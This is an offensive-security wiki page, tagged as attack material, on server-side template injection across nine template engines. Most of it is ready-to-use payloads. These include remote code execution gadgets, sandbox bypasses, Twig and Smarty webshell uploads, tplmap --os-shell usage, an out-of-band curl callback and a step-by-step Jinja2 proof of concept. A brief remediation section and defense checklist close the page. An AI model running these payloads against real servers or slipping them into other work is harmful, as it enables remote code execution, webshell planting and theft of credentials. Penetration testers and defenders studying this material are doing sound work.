---
type: wiki
category: attack
tool: tplmap,manual
status: active
last-updated: 2026-04-21
---

# SSTI Deep-Dive Attacks (2026 Edition)

> **Purpose:** Server-Side Template Injection is a P1 RCE. Once you identify the template engine, applying the matching RCE gadget is usually enough. This doc lists fingerprinting, payloads, and sandbox escapes for 8 common engines.

## 0. Detection Flow

### 0.1 Generic Fingerprint Probe

```
{{7*7}}        → 49 (Jinja2/Twig/Handlebars) / 7*7 (plain text or mustache)
${7*7}         → 49 (Freemarker/Velocity/Thymeleaf/JSP)
<%= 7*7 %>     → 49 (ERB/EJS/JSP)
#{7*7}         → 49 (Pug/Razor/Pug-like)
*{7*7}         → 49 (Thymeleaf)
@{7*7}         → Angular (CSTI, not SSTI) / Razor
{7*7}          → 7*7 or 49 (Angular / React interpolation)
```

### 0.2 Differential Probe (Narrowing Down the Engine)

| Probe | Jinja2 | Twig | Freemarker | Velocity | ERB | EJS |
|-------|--------|------|------------|----------|-----|-----|
| `{{7*'7'}}` | `7777777` | `49` | ERROR | ERROR | - | - |
| `{{7*7}}` | `49` | `49` | - | - | - | - |
| `${7*7}` | - | - | `49` | `49` | - | - |
| `${"z".getClass()}` | - | - | `java.lang.String` | `class java.lang.String` | - | - |
| `{{self}}` | `<Context ...>` | `Twig\Template_...` | - | - | - | - |
| `<%= 7*7 %>` | - | - | - | - | `49` | `49` |
| `<%= __proto__ %>` | - | - | - | - | - | EJS-specific |

### 0.3 Automation

```bash
# tplmap
git clone https://github.com/epinna/tplmap
cd tplmap
pip install -r requirements.txt
python2 tplmap.py -u 'https://target.com/page?name=test*'

# --os-shell for an interactive shell
python2 tplmap.py -u '...' --os-shell
```

## 1. Jinja2 (Python / Flask / Django)

### 1.1 Environment Enumeration

```
{{ config }}                              → Flask config
{{ config.items() }}
{{ self }}
{{ self._TemplateReference__context }}
{{ request.application.__globals__ }}
```

### 1.2 RCE (Classic)

```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
# → [<class 'type'>, <class 'weakref'>, ..., <class 'object'>, ...]
# Find the index of subprocess.Popen

{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```

### 1.3 RCE (2026 Short Form)

```python
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ url_for.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
{{ get_flashed_messages.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()') }}

# Especially concise for Flask
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### 1.4 Sandbox Bypass

Jinja2 has a `SandboxedEnvironment`:

```python
# Bypassing the attr block
{{ ''|attr('__class__') }}
{{ ''['__class__'] }}

# Bypassing the keyword filter
{{ ''[request.args.x] }}    # URL: ?x=__class__
```

## 2. Twig (PHP / Symfony / Drupal 8+)

### 2.1 Fingerprint

```
{{ 7*'7' }} → 49 (Twig, unlike Jinja2 it doesn't return a string)
{{ _self }} → Twig\Template_...
{{ dump() }} → Twig environment dump
```

### 2.2 RCE

```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}

{{ _self.env.setCache("ftp://attacker:...")}}

{# Twig 2.x+ disables _self.env, use a filter instead #}
{{ ['id']|filter('system') }}
{{ ['cat /etc/passwd']|map('system')|join(' ') }}
```

### 2.3 Symfony Without a Sandbox

```twig
{{ app.request.files.get('x').move('/var/www/html','s.php') }}
# Upload a webshell via SSTI
```

## 3. Freemarker (Java / Spring / Liferay)

### 3.1 Fingerprint

```
${7*7} → 49
${"z".getClass()} → class java.lang.String
```

### 3.2 RCE

```
<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}

${"freemarker.template.utility.Execute"?new()("id")}

<#assign cl="freemarker.template.utility.ObjectConstructor"?new()>
${cl("java.lang.ProcessBuilder","id").start().getInputStream()}
```

### 3.3 Sandbox Bypass (StaticModels)

```
${objectConstructor("freemarker.template.utility.Execute").exec(["id"])}
```

## 4. Velocity (Apache / Older Spring)

### 4.1 Fingerprint

```
${7*7} → 49 (less common)
#set($x = 7*7)${x} → 49
```

### 4.2 RCE

```
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass().forName("java.lang.String")).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")
```

Shorter version:

```
#set($x=[])
#set($cmd="id")
#set($rt=$x.class.forName("java.lang.Runtime").getRuntime())
$rt.exec($cmd).inputStream.readLines()
```

## 5. Thymeleaf (Common in Spring Boot)

### 5.1 Fingerprint

```
${7*7}   → 49
*{7*7}   → 49
#{7*7}   → 7*7 (string)
@{7*7}   → URL context
```

### 5.2 RCE (If Preprocessing `__${}__` Is Present)

```
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x

# Or inline
[[${T(Runtime).getRuntime().exec("id")}]]
```

### 5.3 CVE-2023-38286 Style (Spring + Thymeleaf)

If the `ServletException` handler turns user input into a view name:

```
GET /page/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream()).next()}__::.x
```

## 6. ERB (Ruby / Rails)

### 6.1 Fingerprint

```
<%= 7*7 %> → 49
```

### 6.2 RCE

```erb
<%= `id` %>                    # backtick execution
<%= `id`.inspect %>
<%= system('id') %>            # executes but only returns true/false
<%= IO.popen('id').read() %>

<%= require('open3'); Open3.capture2('id') %>
```

### 6.3 Rails-Specific

```erb
<%= render inline: "<%= `id` %>" %>
<%= render file: "/etc/passwd" %>        # LFI
```

## 7. EJS (Node.js)

### 7.1 Fingerprint

```
<%= 7*7 %> → 49
<%- 7*7 %> → 49 (unescaped)
```

### 7.2 RCE

```ejs
<%- global.process.mainModule.require('child_process').execSync('id') %>

<%- require('child_process').execSync('id') %>

# Template compile injection (CVE-2022-29078)
{"settings":{"view options":{"outputFunctionName":"x;global.process.mainModule.require('child_process').execSync('id');x"}}}
```

### 7.3 Pug / Jade

```pug
- var x = global.process.mainModule.require('child_process').execSync('id').toString()
p= x

#{process.mainModule.require('child_process').execSync('id')}
```

## 8. Handlebars / Mustache

### 8.1 Fingerprint

```
{{7*7}} → 7*7 (not evaluated) — Handlebars doesn't compute this by default
```

### 8.2 Handlebars (Node.js) — If a Helper Is Unsafe

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## 9. Smarty (PHP)

### 9.1 Fingerprint

```
{$smarty.version} → Smarty version
```

### 9.2 RCE

```smarty
{php}system('id');{/php}    # Smarty 2.x / 3.x (php tag)

# Smarty 3+ disables {php}, use instead:
{system('id')}                # Smarty Lite
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']);?>",self::clearConfig())}
```

## 10. Blind SSTI

If the response doesn't reflect the payload:

```python
# Jinja2 time-based blind
{{ ''.join(['a' for _ in range(10000000)]) }}  # burns CPU
{{ sleep(5) }}                                   # if sleep is imported
```

OOB:

```python
{{ lipsum.__globals__['os'].popen('curl http://oast/').read() }}
```

## 11. Tools

### 11.1 tplmap (Primary)

```bash
git clone https://github.com/epinna/tplmap
python2 tplmap.py -u 'https://target.com/?name=*'

# Engine-specific
python2 tplmap.py -u '...' -e jinja2,twig,freemarker
```

### 11.2 Burp Extensions

- Tplmap extension
- Backslash Powered Scanner (automatically finds SSTI)

### 11.3 Nuclei SSTI Templates

```bash
nuclei -u https://target.com -tags ssti,rce
```

## 12. Full PoC: Jinja2 → RCE

### Step 1: Fingerprint

```bash
curl "https://target.com/greet?name={{7*7}}"
# Response contains "Hello 49" → SSTI

curl "https://target.com/greet?name={{7*'7'}}"
# Response "Hello 7777777" → Jinja2
```

### Step 2: Environment Enumeration

```bash
curl "https://target.com/greet?name={{self}}"
# "<Context 0x7f...>"
```

### Step 3: RCE

```bash
curl -G "https://target.com/greet" \
  --data-urlencode "name={{ lipsum.__globals__['os'].popen('id').read() }}"
# "Hello uid=33(www-data) gid=33(www-data)"
```

### Step 4: Report

```markdown
## Vulnerability Overview
https://target.com/greet?name= feeds user input directly into Jinja2's
render() without sandboxing. An attacker can achieve pre-auth RCE via
`{{ lipsum.__globals__['os'].popen('id').read() }}`.

## PoC
[3 curl commands]

## Impact
- Pre-auth remote code execution (user: www-data)
- Full server compromise, including reading /etc/passwd, app secrets, DB credentials

## Severity
P1 / Critical

## Remediation
1. Never render_template_string(user_input)
2. If dynamic templates are required, use a sandboxed env + whitelisted variables
3. User input should always be passed as context ({{ name }}), never as the template string itself
4. WAF filtering on {{ / ${ / <%= character combinations
```

## 13. Defense Checklist

```
1. Never render user input as a template string
2. User input should only be used for variable substitution ({{ name }} where name=user_input)
3. If templates must be user-configurable, use a sandboxed environment
4. Jinja2: SandboxedEnvironment + whitelisted globals
5. Twig: sandbox() + explicit policies
6. Thymeleaf: disable preprocessing `__${}__`
7. Freemarker: enable a whitelisted new_builtin_class_resolver
8. WAF patterns: filter {{, ${, <%=, #{ combinations (high false-positive rate, use as supplementary defense)
9. CSP cannot block SSTI (it's server-side)
```

## Related Documents

- [18-payload-cheatsheet.md](18-payload-cheatsheet.md) — SSTI polyglot
- [67-deserialization.md](67-deserialization.md) — Java / Ruby / Node extensions into deserialization
- [74-command-injection.md](74-command-injection.md) — Full command injection guide for SSTI reaching system()
- PortSwigger SSTI: https://portswigger.net/web-security/server-side-template-injection
- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- tplmap: https://github.com/epinna/tplmap
